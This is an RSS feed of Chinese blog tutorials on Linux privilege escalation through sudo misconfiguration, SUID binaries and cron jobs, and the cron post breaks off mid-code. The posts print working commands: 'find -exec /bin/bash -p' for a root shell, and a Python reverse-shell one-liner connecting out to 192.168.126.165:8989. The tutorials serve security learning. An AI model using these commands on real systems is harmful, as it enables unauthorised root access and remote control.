<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>提权 on iceH&#39;s Blog</title>
        <link>https://360rce.github.io/tags/%E6%8F%90%E6%9D%83/</link>
        <description>Recent content in 提权 on iceH&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
        <lastBuildDate>Fri, 27 Nov 2020 14:38:09 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/%E6%8F%90%E6%9D%83/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Linux提权之Sudo配置错误</title>
        <link>https://360rce.github.io/p/1ibvkqhp/</link>
        <pubDate>Fri, 27 Nov 2020 14:38:09 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/1ibvkqhp/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/gp/wallhaven-gpd26e.jpg" alt="Featured image of post Linux提权之Sudo配置错误" /&gt;&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h2&gt;
&lt;p&gt;如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。&lt;/p&gt;
&lt;p&gt;管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。&lt;/p&gt;
&lt;p&gt;一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道&amp;rsquo;find&amp;rsquo;命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
&lt;p&gt;拿到普通用户权限之后，使用&lt;code&gt;sudo –l&lt;/code&gt;查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /usr/bin/find /home -exec /bin/bash -p &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/1ibvkqhp/01.jpg&#34;
	width=&#34;911&#34;
	height=&#34;299&#34;
	srcset=&#34;https://360rce.github.io/p/1ibvkqhp/01_hudf269e45077711ff80a21d5bea2f100f_20930_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/1ibvkqhp/01_hudf269e45077711ff80a21d5bea2f100f_20930_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;root&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;304&#34;
		data-flex-basis=&#34;731px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux提权之Suid提权</title>
        <link>https://360rce.github.io/p/b222zucs/</link>
        <pubDate>Fri, 27 Nov 2020 13:44:54 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/b222zucs/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/we/wallhaven-wexqp7.jpg" alt="Featured image of post Linux提权之Suid提权" /&gt;&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h2&gt;
&lt;p&gt;SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。&lt;/p&gt;
&lt;p&gt;SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。&lt;/p&gt;
&lt;p&gt;许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。&lt;/p&gt;
&lt;h2 id=&#34;常见的可用于suid提权的命令&#34;&gt;常见的可用于suid提权的命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Vim
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;More
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Less
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nano
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
&lt;h3 id=&#34;信息收集&#34;&gt;信息收集&lt;/h3&gt;
&lt;p&gt;使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。&lt;/p&gt;
&lt;p&gt;该脚本的下载地址：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/rebootuser/LinEnum
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;执行LinEnum之后，发现find这个命令有SUID权限。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/b222zucs/01.jpg&#34;
	width=&#34;1006&#34;
	height=&#34;391&#34;
	srcset=&#34;https://360rce.github.io/p/b222zucs/01_huba8aefe95904059e8339dc0aea63ae85_35342_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/b222zucs/01_huba8aefe95904059e8339dc0aea63ae85_35342_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;收集信息&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;257&#34;
		data-flex-basis=&#34;617px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认-find-有-root-执行权限&#34;&gt;确认 find 有 root 执行权限&lt;/h3&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch ice
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/find ice -exec whoami &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;确认 find 命令是否是 root 权限执行.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/b222zucs/02.jpg&#34;
	width=&#34;615&#34;
	height=&#34;66&#34;
	srcset=&#34;https://360rce.github.io/p/b222zucs/02_hu14897f49839461807221a6ca1615a56c_3475_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/b222zucs/02_hu14897f49839461807221a6ca1615a56c_3475_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;root&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;931&#34;
		data-flex-basis=&#34;2236px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h3&gt;
&lt;p&gt;如果目标机上有 python 环境，可以使用 python 命令反弹 shell：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#反弹一个sh类型的shell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.126.165&amp;#34;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;结合 find :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/find ice -exec python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.126.165&amp;#34;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid &lt;code&gt;（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）&lt;/code&gt;为 root 权限，但是反弹 shell 中并没有。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/b222zucs/03.jpg&#34;
	width=&#34;727&#34;
	height=&#34;190&#34;
	srcset=&#34;https://360rce.github.io/p/b222zucs/03_hu78e99fac7d92e467ee38f84311541746_184170_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/b222zucs/03_hu78e99fac7d92e467ee38f84311541746_184170_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;非root权限&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;382&#34;
		data-flex-basis=&#34;918px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。&lt;/p&gt;
&lt;p&gt;我们尝试使用如下命令获取 shell：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/find ice -exec /bin/bash -p &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/b222zucs/04.jpg&#34;
	width=&#34;659&#34;
	height=&#34;90&#34;
	srcset=&#34;https://360rce.github.io/p/b222zucs/04_huce6282970beed9c8a606af1b55949a95_3386_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/b222zucs/04_huce6282970beed9c8a606af1b55949a95_3386_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;提权成功&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;732&#34;
		data-flex-basis=&#34;1757px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到获取的 shell 为 root 权限。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux提权之定时任务</title>
        <link>https://360rce.github.io/p/aor7ahen/</link>
        <pubDate>Thu, 26 Nov 2020 15:40:12 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/aor7ahen/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/l8/wallhaven-l8d8yy.jpg" alt="Featured image of post Linux提权之定时任务" /&gt;&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h2&gt;
&lt;p&gt;定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/01.png&#34;
	width=&#34;694&#34;
	height=&#34;172&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/01_hua98ec311ae4ad7e46926c56ea985374a_12539_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/01_hua98ec311ae4ad7e46926c56ea985374a_12539_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Linux提权之定时任务&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;403&#34;
		data-flex-basis=&#34;968px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; * * * &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; /var/log/apache/error_log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果未正确配置Cron，则可以利用它获得root特权。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cron作业中是否有可写的脚本或二进制文件？&lt;/li&gt;
&lt;li&gt;我们可以覆盖cron文件本身吗？&lt;/li&gt;
&lt;li&gt;cron.d目录可写吗？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
&lt;h3 id=&#34;创建一个定时任务&#34;&gt;创建一个定时任务&lt;/h3&gt;
&lt;p&gt;目标：创建一个运行python脚本来擦除特定目录的所有数据
假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir cleanup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; cleanup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hello freinds&amp;#34;&lt;/span&gt; &amp;gt; 1.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ALL files will be deleted in 2 mints&amp;#34;&lt;/span&gt; &amp;gt; 2.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; 1.php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &amp;gt; 2.php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;下图是上面命令执行的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/02.png&#34;
	width=&#34;869&#34;
	height=&#34;206&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/02_hud359e6fbd28c00302629ace0e379ff58_13468_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/02_hud359e6fbd28c00302629ace0e379ff58_13468_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;创建文件&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;421&#34;
		data-flex-basis=&#34;1012px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下面我们写一个python程序来删除 /home/cleanup的内容。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /tmp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi cleanup.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env python
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;import os
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import sys
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   os.system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rm -r /root/cleanup/* &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;except:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    sys.exit&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
